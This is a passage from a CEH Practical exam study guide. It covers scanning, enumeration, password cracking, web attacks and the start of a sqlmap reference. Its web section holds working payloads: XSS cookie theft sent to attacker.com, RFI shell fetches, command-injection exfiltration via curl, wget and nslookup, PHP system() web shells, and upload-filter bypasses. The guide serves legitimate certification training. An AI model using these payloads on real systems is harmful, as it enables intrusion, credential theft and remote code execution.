# 🎯 CEH Practical Exam Study Playbook

[![Certification](https://img.shields.io/badge/Certification-CEH%20Practical-red)]()
[![EC-Council](https://img.shields.io/badge/EC--Council-v13-blue)]()
[![Exam Duration](https://img.shields.io/badge/Duration-6%20Hours-orange)]()
[![Questions](https://img.shields.io/badge/Questions-20-green)]()

> **Complete hands-on preparation guide for the EC-Council Certified Ethical Hacker (CEH) Practical Examination**

---

## 📋 Table of Contents

<details>
<summary>Click to expand</summary>

1. [Exam Overview](#-exam-overview)
2. [Quick Reference Cheat Sheet](#-quick-reference-cheat-sheet)
3. [Exam Environment](#-exam-environment)
4. [Network Scanning & Enumeration](#-network-scanning--enumeration)
   - SNMP, LDAP, DNS, SMTP Enumeration
5. [Password Cracking](#-password-cracking)
   - Custom Wordlist Generation
   - Hashcat Advanced (Masks, Rules)
   - Password Spraying
6. [Web Application Attacks](#-web-application-attacks)
   - XSS, LFI/RFI, Command Injection
   - File Upload Bypass, IDOR
   - Ffuf Fuzzing
7. [SQL Injection](#-sql-injection)
   - Blind SQLi, DBMS-Specific Payloads
   - Filter Bypass Techniques
8. [Steganography](#-steganography)
   - Zsteg, Stegsolve, Foremost
   - Audio Steganography
9. [Cryptography](#-cryptography)
   - OpenSSL, Cipher Identification
   - GPG/PGP, Crypto Attacks
10. [Wireshark & Packet Analysis](#-wireshark--packet-analysis)
    - Tshark Commands
    - Attack Pattern Detection
11. [System Hacking & Exploitation](#-system-hacking--exploitation)
    - Linux/Windows Privilege Escalation
    - Post-Exploitation & LOLBins
    - Persistence Techniques
12. [Mobile Platform Hacking](#-mobile-platform-hacking)
13. [Wireless Network Hacking](#-wireless-network-hacking)
14. [Malware Analysis](#-malware-analysis)
15. [OSINT & Reconnaissance](#-osint--reconnaissance)
16. [Social Engineering Toolkit](#-social-engineering-toolkit-set)
17. [Common Exam Questions](#-common-exam-questions)
    - Detailed Scenario Walkthroughs
18. [Exam Strategy & Tips](#-exam-strategy--tips)
19. [Practice Labs & Resources](#-practice-labs--resources)

</details>

---

## 📊 Exam Overview

### Exam Details

| Attribute | Details |
|-----------|---------|
| **Exam Code** | CEH Practical |
| **Duration** | 6 hours (includes 15-minute break) |
| **Number of Questions** | 20 practical challenges |
| **Passing Score** | 70% (minimum 14 correct) |
| **Format** | Hands-on, proctored, browser-based (iLab) |
| **Open Book** | Yes (Google allowed, no communication) |
| **Cost** | $550 USD |
| **Validity** | 3 years |
| **Retake** | Discounted voucher available |

### Skills Tested

```
┌─────────────────────────────────────────────────────────────────┐
│                    CEH PRACTICAL DOMAINS                        │
├─────────────────────────────────────────────────────────────────┤
│  ▸ Network Scanning & Enumeration                               │
│  ▸ Vulnerability Analysis                                       │
│  ▸ System Hacking & Exploitation                                │
│  ▸ Web Application Attacks (SQLi, XSS, Parameter Tampering)     │
│  ▸ Password Cracking & Brute-forcing                            │
│  ▸ Steganography & Steganalysis                                 │
│  ▸ Cryptography Attacks                                         │
│  ▸ Packet Sniffing & Analysis                                   │
│  ▸ Mobile Platform Hacking                                      │
│  ▸ Wireless Network Attacks                                     │
│  ▸ Malware Analysis & Reverse Engineering                       │
│  ▸ Social Engineering Techniques                                │
└─────────────────────────────────────────────────────────────────┘
```

### Answer Format Hints

**IMPORTANT**: Pay attention to answer format hints in questions:
- `AA` = 2 Capital letters
- `aa` = 2 lowercase letters
- `NN` or `00` = 2 numbers
- `**` = 2 special characters
- Example: `AAaa00**` = Password format like `ABcd12!@`

---

## ⚡ Quick Reference Cheat Sheet

### 🔍 Network Discovery

```bash
# Host Discovery
nmap -sn 192.168.1.0/24                    # Ping sweep
nmap -sn 192.168.1.0/24 -oN hosts.txt      # Save live hosts
netdiscover -i eth0                         # ARP-based discovery

# Port Scanning
nmap -sS -sV -O 192.168.1.10               # SYN scan + version + OS
nmap -sC -sV -sS -p- 192.168.1.10          # Full scan with scripts
nmap -Pn -p 21,22,80,443,3389 192.168.1.10 # Specific ports

# Service-Specific Scans
nmap -Pn -p 21 192.168.1.0/24 | grep -B 5 open    # FTP hosts
nmap -Pn -p 3389 192.168.1.0/24 | grep -B 5 open  # RDP hosts
nmap -Pn -p 3306 192.168.1.0/24 | grep -B 5 open  # MySQL hosts
nmap -Pn -p 445 192.168.1.0/24 | grep -B 5 open   # SMB hosts
```

### 🔐 Password Cracking

```bash
# Hydra - Brute Force
hydra -l admin -P /path/wordlist.txt ftp://192.168.1.10
hydra -L users.txt -P passwords.txt ssh://192.168.1.10
hydra -l admin -P wordlist.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# John The Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=raw-md5 --wordlist=wordlist.txt hash.txt
john --show hash.txt

# Hashcat
hashcat -m 0 hash.txt wordlist.txt         # MD5
hashcat -m 1000 hash.txt wordlist.txt      # NTLM
hashcat -m 1800 hash.txt wordlist.txt      # SHA-512
```

### 💉 SQL Injection

```bash
# SQLMap Basics
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# With Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123" --dbs
```

### 🖼️ Steganography

```bash
# Linux Tools
steghide extract -sf image.jpg             # Extract hidden data
steghide embed -cf image.jpg -ef secret.txt # Hide data

# Windows Tools (GUI)
OpenStego                                   # Hide/Extract data
Snow                                        # Whitespace steganography
```

### 🔒 Cryptography

```bash
# Hash Calculation
md5sum file.txt                            # MD5 hash
sha1sum file.txt                           # SHA1 hash
sha256sum file.txt                         # SHA256 hash

# VeraCrypt - Mount encrypted volume
veracrypt --mount /path/volume /mount/point

# CryptTool (Windows) - GUI for encryption/decryption
```

### 📊 Wireshark Filters

```bash
# Common Filters
ip.addr == 192.168.1.10                    # Specific IP
tcp.port == 80                             # HTTP traffic
http.request.method == "POST"              # POST requests
ftp                                         # FTP traffic
tcp.flags.syn == 1                         # SYN packets
dns                                         # DNS queries
```

---

## 🖥️ Exam Environment

### Virtual Machines Provided

```
┌────────────────────────────────────────────────────────────┐
│                    EXAM ENVIRONMENT                         │
├────────────────────────────────────────────────────────────┤
│                                                             │
│   ┌─────────────────┐       ┌─────────────────┐            │
│   │   PARROT OS     │       │  WINDOWS 11/    │            │
│   │  (Attack Box)   │       │  SERVER 2016    │            │
│   │                 │       │                 │            │
│   │ • Nmap          │       │ • OpenStego     │            │
│   │ • Metasploit    │       │ • VeraCrypt     │            │
│   │ • SQLMap        │       │ • CryptTool     │            │
│   │ • Hydra         │       │ • Wireshark     │            │
│   │ • Wireshark     │       │ • HashCalc      │            │
│   │ • WPScan        │       │ • SNOW          │            │
│   │ • John/Hashcat  │       │ • BCTextEncoder │            │
│   └─────────────────┘       └─────────────────┘            │
│                                                             │
│              ↓ Target Network (5 machines) ↓               │
│   ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐                 │
│   │ VM1 │ │ VM2 │ │ VM3 │ │ VM4 │ │ VM5 │                 │
│   └─────┘ └─────┘ └─────┘ └─────┘ └─────┘                 │
│                                                             │
└────────────────────────────────────────────────────────────┘
```

### Key Locations

| Item | Location |
|------|----------|
| **Wordlists** | `/root/Desktop/wordlists/` or `/usr/share/wordlists/` |
| **Tools** | Parrot menu or `/usr/bin/` |
| **User/Pass files** | Usually on Desktop |
| **PCAP files** | Desktop or specified in question |

### First Steps in Exam

```bash
# 1. Discover network subnets and live hosts
nmap -sn 10.10.10.0/24 -oN hosts_10.txt
nmap -sn 172.16.0.0/24 -oN hosts_172.txt
nmap -sn 192.168.0.0/24 -oN hosts_192.txt

# 2. Full port scan on discovered hosts
nmap -sC -sV -sS -O -p- 10.10.10.10 -oN full_scan.txt

# 3. Save results for reference throughout exam
cat hosts_*.txt | grep "Nmap scan report" > all_hosts.txt
```

---

## 🔍 Network Scanning & Enumeration

### Nmap - Complete Reference

#### Host Discovery

```bash
# Basic host discovery
nmap -sn 192.168.1.0/24                    # Ping sweep (no port scan)
nmap -sn -PE 192.168.1.0/24                # ICMP echo
nmap -sn -PS22,80,443 192.168.1.0/24       # TCP SYN ping
nmap -sn -PA22,80,443 192.168.1.0/24       # TCP ACK ping
nmap -sn -PU53,161 192.168.1.0/24          # UDP ping

# List scan (no packets sent)
nmap -sL 192.168.1.0/24
```

#### Port Scanning Techniques

```bash
# TCP Scans
nmap -sS 192.168.1.10                      # SYN scan (stealth)
nmap -sT 192.168.1.10                      # TCP connect scan
nmap -sA 192.168.1.10                      # ACK scan (firewall detection)
nmap -sW 192.168.1.10                      # Window scan
nmap -sN 192.168.1.10                      # NULL scan
nmap -sF 192.168.1.10                      # FIN scan
nmap -sX 192.168.1.10                      # Xmas scan

# UDP Scan
nmap -sU 192.168.1.10                      # UDP scan
nmap -sU -p 53,161,162 192.168.1.10        # Specific UDP ports

# Combined Scans
nmap -sS -sU -p T:1-1000,U:53,161 192.168.1.10
```

#### Service & Version Detection

```bash
# Version detection
nmap -sV 192.168.1.10                      # Service versions
nmap -sV --version-intensity 5 192.168.1.10 # More aggressive

# OS Detection
nmap -O 192.168.1.10                       # OS fingerprinting
nmap -O --osscan-guess 192.168.1.10        # Aggressive OS guess

# Combined comprehensive scan
nmap -sS -sV -O -sC 192.168.1.10           # Full enumeration
nmap -A 192.168.1.10                       # Aggressive (same as above)
```

#### Nmap Scripting Engine (NSE)

```bash
# Script categories
nmap --script=default 192.168.1.10         # Default scripts
nmap --script=vuln 192.168.1.10            # Vulnerability scripts
nmap --script=safe 192.168.1.10            # Safe scripts
nmap --script=exploit 192.168.1.10         # Exploit scripts

# Specific scripts
nmap --script=smb-enum-shares 192.168.1.10
nmap --script=smb-enum-users 192.168.1.10
nmap --script=smb-os-discovery 192.168.1.10
nmap --script=http-enum 192.168.1.10
nmap --script=ftp-anon 192.168.1.10
nmap --script=ssh-brute 192.168.1.10
nmap --script=mysql-enum 192.168.1.10

# Banner grabbing
nmap --script=banner 192.168.1.10

# Vulnerability scanning
nmap --script=vuln 192.168.1.10
nmap --script=smb-vuln-ms17-010 192.168.1.10  # EternalBlue
```

#### Output Formats

```bash
nmap -oN output.txt 192.168.1.10           # Normal output
nmap -oX output.xml 192.168.1.10           # XML output
nmap -oG output.gnmap 192.168.1.10         # Grepable output
nmap -oA output 192.168.1.10               # All formats
```

### SMB Enumeration

```bash
# Using Nmap
nmap -p 445 --script=smb-enum-shares 192.168.1.10
nmap -p 445 --script=smb-enum-users 192.168.1.10
nmap -p 445 --script=smb-os-discovery 192.168.1.10
nmap -p 445 --script=smb-enum-groups --script-args smbusername=admin,smbpassword=pass123 192.168.1.10

# Using smbclient
smbclient -L //192.168.1.10                # List shares (anonymous)
smbclient -L //192.168.1.10 -U username    # List shares (authenticated)
smbclient //192.168.1.10/sharename         # Connect to share
smbclient //192.168.1.10/sharename -U username

# SMB Commands (after connecting)
ls                                          # List files
get filename                                # Download file
put filename                                # Upload file
cd directory                                # Change directory

# Using enum4linux
enum4linux -a 192.168.1.10                 # Full enumeration
enum4linux -U 192.168.1.10                 # Users
enum4linux -S 192.168.1.10                 # Shares
```

### FTP Enumeration

```bash
# Check for anonymous login
nmap --script=ftp-anon 192.168.1.10

# Manual FTP connection
ftp 192.168.1.10
> anonymous                                 # Try anonymous login
> anonymous@example.com                     # Password

# FTP commands
ls                                          # List files
get filename                                # Download
put filename                                # Upload
binary                                      # Binary mode
ascii                                       # ASCII mode
```

### RDP Enumeration

```bash
# Find RDP hosts
nmap -Pn -p 3389 192.168.1.0/24 | grep -B 5 open

# RDP Scanner (Metasploit)
msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 192.168.1.0/24
run

# Connect to RDP
xfreerdp /u:username /p:password /v:192.168.1.10:3389
rdesktop 192.168.1.10
```

### NetBIOS Enumeration

```bash
# Nmap NetBIOS scripts
nmap -sU -p 137 --script=nbstat 192.168.1.10

# nbtscan
nbtscan 192.168.1.0/24
nbtscan -r 192.168.1.0/24                  # Recursive

# nmblookup
nmblookup -A 192.168.1.10
```

### SNMP Enumeration

```bash
# Discover SNMP services
nmap -sU -p 161 192.168.1.0/24 --open

# SNMP walk - extract all data
snmpwalk -v1 -c public 192.168.1.10
snmpwalk -v2c -c public 192.168.1.10
snmpwalk -v3 -u username -l authNoPriv -a MD5 -A password 192.168.1.10

# SNMP specific OIDs
snmpwalk -v1 -c public 192.168.1.10 1.3.6.1.2.1.1      # System info
snmpwalk -v1 -c public 192.168.1.10 1.3.6.1.4.1.77.1.2.25  # Windows users
snmpwalk -v2c -c public 192.168.1.10 hrSWRunName       # Running processes

# Community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.10
nmap -sU -p 161 --script=snmp-brute 192.168.1.10

# Nmap SNMP scripts
nmap -sU -p 161 --script=snmp-info 192.168.1.10
nmap -sU -p 161 --script=snmp-interfaces 192.168.1.10
nmap -sU -p 161 --script=snmp-processes 192.168.1.10
nmap -sU -p 161 --script=snmp-sysdescr 192.168.1.10
nmap -sU -p 161 --script=snmp-win32-users 192.168.1.10
nmap -sU -p 161 --script=snmp-win32-software 192.168.1.10
```

### LDAP Enumeration

```bash
# Find LDAP services
nmap -p 389,636 192.168.1.0/24 --open

# Anonymous LDAP query
ldapsearch -x -H ldap://192.168.1.10 -b "dc=domain,dc=com"

# Authenticated LDAP query
ldapsearch -x -H ldap://192.168.1.10 -D "cn=admin,dc=domain,dc=com" -W -b "dc=domain,dc=com"

# Enumerate users
ldapsearch -x -H ldap://192.168.1.10 -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName

# Enumerate groups
ldapsearch -x -H ldap://192.168.1.10 -b "dc=domain,dc=com" "(objectClass=group)" cn member

# Nmap LDAP scripts
nmap -p 389 --script=ldap-rootdse 192.168.1.10
nmap -p 389 --script=ldap-search 192.168.1.10
nmap -p 389 --script=ldap-brute 192.168.1.10

# ldapenum (if available)
ldapenum -u "" -p "" -d 192.168.1.10
```

### DNS Enumeration

```bash
# DNS zone transfer
dig axfr @192.168.1.10 domain.com
host -t axfr domain.com 192.168.1.10
dnsrecon -d domain.com -t axfr

# DNS enumeration
dnsrecon -d domain.com -t std           # Standard enumeration
dnsrecon -d domain.com -t brt -D /usr/share/wordlists/dnsmap.txt  # Brute force
dnsenum domain.com

# Nmap DNS scripts
nmap -p 53 --script=dns-zone-transfer --script-args dns-zone-transfer.domain=domain.com 192.168.1.10
nmap --script=dns-brute domain.com

# Reverse DNS lookup
dig -x 192.168.1.10
host 192.168.1.10

# DNS cache snooping
nmap -sU -p 53 --script=dns-cache-snoop 192.168.1.10
```

### SMTP Enumeration

```bash
# Find SMTP servers
nmap -p 25,465,587 192.168.1.0/24 --open

# User enumeration (VRFY command)
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.10

# User enumeration (RCPT TO command)
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.10

# User enumeration (EXPN command)
smtp-user-enum -M EXPN -U users.txt -t 192.168.1.10

# Nmap SMTP scripts
nmap -p 25 --script=smtp-enum-users 192.168.1.10
nmap -p 25 --script=smtp-commands 192.168.1.10
nmap -p 25 --script=smtp-open-relay 192.168.1.10

# Manual SMTP enumeration
nc 192.168.1.10 25
HELO attacker.com
VRFY admin
VRFY root
```

---

## 🔐 Password Cracking

### Hydra - Network Brute Force

#### Supported Protocols

```bash
# FTP
hydra -l admin -P wordlist.txt ftp://192.168.1.10
hydra -L users.txt -P passwords.txt 192.168.1.10 ftp

# SSH
hydra -l root -P wordlist.txt ssh://192.168.1.10
hydra -l root -P wordlist.txt 192.168.1.10 ssh -s 2222  # Custom port

# Telnet
hydra -l admin -P wordlist.txt telnet://192.168.1.10

# RDP
hydra -l administrator -P wordlist.txt rdp://192.168.1.10

# SMB
hydra -l admin -P wordlist.txt smb://192.168.1.10

# MySQL
hydra -l root -P wordlist.txt mysql://192.168.1.10

# HTTP Basic Auth
hydra -l admin -P wordlist.txt http-get://192.168.1.10/admin

# HTTP POST Form
hydra -l admin -P wordlist.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# Options
-l LOGIN         # Single username
-L FILE          # Username list
-p PASS          # Single password
-P FILE          # Password list
-t TASKS         # Parallel connections (default: 16)
-s PORT          # Custom port
-V               # Verbose
-f               # Stop on first success
```

### John The Ripper

#### Hash Cracking

```bash
# Identify hash type
john --list=formats | grep -i md5

# Crack MD5
john --format=raw-md5 --wordlist=wordlist.txt hash.txt

# Crack SHA1
john --format=raw-sha1 --wordlist=wordlist.txt hash.txt

# Crack SHA256
john --format=raw-sha256 --wordlist=wordlist.txt hash.txt

# Crack SHA512
john --format=raw-sha512 --wordlist=wordlist.txt hash.txt

# Crack NTLM (Windows)
john --format=nt --wordlist=wordlist.txt hash.txt

# Crack Linux shadow
john --wordlist=wordlist.txt shadow.txt

# Show cracked passwords
john --show hash.txt

# Incremental mode (brute force)
john --incremental hash.txt

# Rules-based attack
john --wordlist=wordlist.txt --rules hash.txt
```

#### Unshadow (Linux Passwords)

```bash
# Combine passwd and shadow files
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=rockyou.txt unshadowed.txt
```

### Hashcat

#### Common Hash Modes

| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1700 | SHA512 |
| 1000 | NTLM |
| 1800 | SHA512crypt ($6$) |
| 3200 | bcrypt |
| 500 | MD5crypt ($1$) |

```bash
# Basic syntax
hashcat -m <mode> hash.txt wordlist.txt

# MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 hash.txt wordlist.txt

# SHA256
hashcat -m 1400 hash.txt wordlist.txt

# With rules
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Show results
hashcat -m 0 hash.txt --show

# Attack modes
-a 0    # Dictionary attack
-a 1    # Combination attack
-a 3    # Brute-force
-a 6    # Hybrid (wordlist + mask)
-a 7    # Hybrid (mask + wordlist)
```

### Hash Identification

```bash
# Using hash-identifier
hash-identifier
> <paste hash>

# Using hashid
hashid <hash>
hashid -m <hash>                           # Show hashcat mode

# Online tools
# https://hashes.com/en/tools/hash_identifier
# https://www.tunnelsup.com/hash-analyzer/
```

### Custom Wordlist Generation

```bash
# CeWL - Generate wordlist from website
cewl http://192.168.1.10 -w custom_wordlist.txt
cewl http://192.168.1.10 -d 2 -m 5 -w wordlist.txt   # Depth 2, min 5 chars
cewl http://192.168.1.10 -e -a -w wordlist.txt       # Include emails and metadata

# Crunch - Generate custom wordlists
crunch 6 8 -o wordlist.txt                           # 6-8 chars, all lowercase
crunch 8 8 0123456789 -o numbers.txt                 # 8 digit numbers
crunch 6 6 -t admin@@ -o admin_wordlist.txt          # Pattern (@ = lowercase)
crunch 8 8 -t %%%%^^^^ -o mixed.txt                  # % = numbers, ^ = special

# Crunch character sets
# @ = lowercase  , = uppercase  % = numbers  ^ = special

# Cupp - Interactive profiled wordlist
cupp -i                                              # Interactive mode

# Username generation from names
username-anarchy --input-file names.txt --select-format first,last,first.last > users.txt
```

### Hashcat Advanced Techniques

```bash
# Mask attack (brute force with pattern)
hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l              # 6 lowercase
hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d              # Ullldd pattern
hashcat -m 0 hash.txt -a 3 company?d?d?d?d           # company + 4 digits

# Mask character sets
# ?l = lowercase  ?u = uppercase  ?d = digits  ?s = special  ?a = all

# Combination attack
hashcat -m 0 hash.txt -a 1 wordlist1.txt wordlist2.txt

# Hybrid attacks
hashcat -m 0 hash.txt -a 6 wordlist.txt ?d?d?d       # Wordlist + 3 digits
hashcat -m 0 hash.txt -a 7 ?d?d?d wordlist.txt       # 3 digits + wordlist

# Rule-based attacks
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# Prince attack (word combinations)
hashcat -m 0 hash.txt -a 0 wordlist.txt --prince

# Show cracked with username
hashcat -m 0 hash.txt --show --username

# Output to file
hashcat -m 0 hash.txt wordlist.txt -o cracked.txt

# Restore session
hashcat -m 0 hash.txt wordlist.txt --session=mysession
hashcat --session=mysession --restore
```

### Password Spraying

```bash
# Spray single password across users
hydra -L users.txt -p 'Password123!' smb://192.168.1.10
crackmapexec smb 192.168.1.10 -u users.txt -p 'Password123!'

# Spray multiple passwords (slow to avoid lockout)
hydra -L users.txt -P top10passwords.txt -t 1 smb://192.168.1.10
```

### Online Hash Lookup

```bash
# Before cracking, check online databases
# https://crackstation.net/
# https://hashes.com/en/decrypt/hash
# https://www.md5online.org/
# https://hashtoolkit.com/

# hashcat potfile - check previously cracked
cat ~/.local/share/hashcat/hashcat.potfile | grep <hash>
```

### Windows Tools

#### HashCalc (GUI)
- Calculate MD5, SHA1, SHA256, SHA512
- Compare file hashes
- Verify file integrity

#### MD5 Calculator
- Right-click file → Compare hash
- Quick hash verification

---

## 🌐 Web Application Attacks

### Directory Enumeration

```bash
# Dirb
dirb http://192.168.1.10/
dirb http://192.168.1.10/ /usr/share/wordlists/dirb/common.txt
dirb http://192.168.1.10/ -o results.txt

# Gobuster
gobuster dir -u http://192.168.1.10/ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://192.168.1.10/ -w wordlist.txt -x php,html,txt

# Dirbuster (GUI)
dirbuster
```

### Nikto - Web Server Scanner

```bash
# Basic scan
nikto -h http://192.168.1.10

# Scan with SSL
nikto -h https://192.168.1.10 -ssl

# Scan specific port
nikto -h http://192.168.1.10:8080

# Output to file
nikto -h http://192.168.1.10 -o results.txt
```

### WPScan - WordPress Scanner

```bash
# Basic scan
wpscan --url http://192.168.1.10/wordpress/

# Enumerate users
wpscan --url http://192.168.1.10/wordpress/ --enumerate u

# Enumerate plugins
wpscan --url http://192.168.1.10/wordpress/ --enumerate p

# Enumerate themes
wpscan --url http://192.168.1.10/wordpress/ --enumerate t

# Full enumeration
wpscan --url http://192.168.1.10/wordpress/ --enumerate u,p,t

# Password brute force
wpscan --url http://192.168.1.10/wordpress/ -U admin -P /path/wordlist.txt
wpscan --url http://192.168.1.10:8080/CEH/ --enumerate u -P /root/Desktop/wordlists/passwords.txt

# With API token (for vulnerability data)
wpscan --url http://192.168.1.10/wordpress/ --api-token YOUR_TOKEN --enumerate vp
```

### OWASP ZAP

```bash
# Start ZAP
zaproxy &

# Key features:
# - Automated Scanner
# - Spider (crawler)
# - Fuzzer
# - Intercepting proxy
# - Active/Passive scanning

# Quick scan workflow:
# 1. Set target URL
# 2. Spider the site
# 3. Run active scan
# 4. Review alerts
```

### Burp Suite

```bash
# Start Burp Suite
burpsuite &

# Key features for CEH:
# - Intercept requests
# - Modify parameters
# - Intruder (brute force)
# - Repeater (manual testing)

# Intruder attack:
# 1. Capture login request
# 2. Send to Intruder
# 3. Mark payload positions
# 4. Load wordlist
# 5. Start attack
```

### Parameter Tampering

```bash
# Common techniques:
# 1. Modify URL parameters
http://target.com/page.php?id=1   → http://target.com/page.php?id=2

# 2. Hidden form fields
<input type="hidden" name="price" value="100">
# Change value="100" to value="1"

# 3. Cookie manipulation
# Use browser dev tools or Burp Suite

# 4. HTTP header manipulation
# Modify User-Agent, Referer, X-Forwarded-For
```

### Cross-Site Scripting (XSS)

```html
<!-- Basic XSS payloads -->
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

<!-- Cookie stealing -->
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
<img src=x onerror="this.src='http://attacker.com/?c='+document.cookie">

<!-- Filter bypass techniques -->
<ScRiPt>alert('XSS')</ScRiPt>                    <!-- Case variation -->
<script>alert(String.fromCharCode(88,83,83))</script>  <!-- Char codes -->
<img src=x onerror=alert`XSS`>                   <!-- Template literals -->
<svg/onload=alert('XSS')>                        <!-- No space -->
<<script>alert('XSS')</script>                   <!-- Double tag -->
<script>alert('XSS')//                           <!-- Comment out -->

<!-- URL encoded -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Event handlers -->
<div onmouseover="alert('XSS')">Hover me</div>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
```

### Local File Inclusion (LFI)

```bash
# Basic LFI
http://target.com/page.php?file=../../../etc/passwd
http://target.com/page.php?file=....//....//....//etc/passwd

# Windows LFI
http://target.com/page.php?file=..\..\..\..\windows\system32\drivers\etc\hosts
http://target.com/page.php?file=C:\Windows\System32\drivers\etc\hosts

# Null byte injection (PHP < 5.3.4)
http://target.com/page.php?file=../../../etc/passwd%00
http://target.com/page.php?file=../../../etc/passwd%00.php

# Wrapper techniques
http://target.com/page.php?file=php://filter/convert.base64-encode/resource=config.php
http://target.com/page.php?file=php://input  (POST data as code)
http://target.com/page.php?file=data://text/plain,<?php system($_GET['cmd']); ?>
http://target.com/page.php?file=expect://ls

# Log poisoning (after injecting PHP in logs)
http://target.com/page.php?file=/var/log/apache2/access.log
http://target.com/page.php?file=/var/log/auth.log

# Common files to target
/etc/passwd
/etc/shadow                              # If readable
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
/var/log/apache2/error.log
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\xampp\apache\logs\access.log
```

### Remote File Inclusion (RFI)

```bash
# Basic RFI (requires allow_url_include=On)
http://target.com/page.php?file=http://attacker.com/shell.txt
http://target.com/page.php?file=http://attacker.com/shell.php

# With null byte
http://target.com/page.php?file=http://attacker.com/shell.txt%00

# SMB share (Windows)
http://target.com/page.php?file=\\attacker.com\share\shell.php
```

### Command Injection

```bash
# Basic command injection
; ls -la
| ls -la
|| ls -la
& ls -la
&& ls -la
$(ls -la)
`ls -la`

# Newline injection
%0als -la

# Common injection points
ping -c 1 192.168.1.10; cat /etc/passwd
192.168.1.10; whoami
192.168.1.10 | id
192.168.1.10 && cat /etc/passwd

# Blind command injection (time-based)
; sleep 10
| sleep 10
& ping -c 10 127.0.0.1 &

# Out-of-band data exfiltration
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?data=$(cat /etc/passwd | base64)
; nslookup $(whoami).attacker.com

# Windows command injection
& dir
| type C:\Windows\win.ini
; net user
& whoami
| ipconfig
; systeminfo

# Filter bypass
;l$()s                                   # Empty variable
;l''s                                    # Empty quotes
;l""s                                    # Double empty quotes
;{ls,-la}                                # Brace expansion
```

### File Upload Bypass

```bash
# Extension bypass techniques
shell.php.jpg                            # Double extension
shell.php%00.jpg                         # Null byte (old PHP)
shell.pHp                                # Case variation
shell.php5                               # Alternative extension
shell.phtml                              # Alternative extension
shell.php.                               # Trailing dot
shell.php;.jpg                           # Semicolon
shell.php%20                             # Trailing space
shell.php::$DATA                         # NTFS stream (Windows)

# Content-Type bypass
# Change Content-Type header to: image/jpeg, image/png, image/gif

# Magic bytes bypass
# Add GIF header: GIF89a before PHP code
GIF89a<?php system($_GET['cmd']); ?>

# .htaccess upload (if allowed)
AddType application/x-httpd-php .jpg
# Then upload shell.jpg

# Polyglot files
# Create image that is also valid PHP

# SVG file with XSS
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert('XSS')</script>
</svg>
```

### Insecure Direct Object Reference (IDOR)

```bash
# URL parameter manipulation
http://target.com/profile?id=100    → http://target.com/profile?id=101
http://target.com/invoice/1234      → http://target.com/invoice/1235
http://target.com/download?file=report_100.pdf → file=report_101.pdf

# API endpoints
GET /api/users/100                  → GET /api/users/101
GET /api/orders/abc123              → GET /api/orders/abc124

# Common IDOR parameters
id, uid, user_id, account, doc, file, order, invoice, report
```

### Ffuf - Fast Fuzzer

```bash
# Directory enumeration
ffuf -u http://192.168.1.10/FUZZ -w /usr/share/wordlists/dirb/common.txt

# File extension fuzzing
ffuf -u http://192.168.1.10/admin.FUZZ -w extensions.txt

# Parameter fuzzing
ffuf -u "http://192.168.1.10/page.php?FUZZ=test" -w params.txt

# POST data fuzzing
ffuf -u http://192.168.1.10/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt

# Header fuzzing
ffuf -u http://192.168.1.10/ -H "X-Forwarded-For: FUZZ" -w ips.txt

# Virtual host discovery
ffuf -u http://192.168.1.10/ -H "Host: FUZZ.target.com" -w subdomains.txt

# Filter by response
ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -fc 404      # Filter code
ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -fs 1234     # Filter size
ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -fw 50       # Filter words
```

---

## 💉 SQL Injection

### SQLMap - Complete Reference

#### Basic Usage

```bash
# Test for SQL injection
sqlmap -u "http://target.com/page.php?id=1"

# Get databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Get tables from database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Get columns from table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Dump table data
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump

# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump
```

#### With Authentication

```bash
# With cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123; security=low" --dbs

# With login
sqlmap -u "http://target.com/page.php?id=1" --auth-type=basic --auth-cred="user:pass"

# From request file (Burp)
sqlmap -r request.txt --dbs
```

#### POST Data Injection

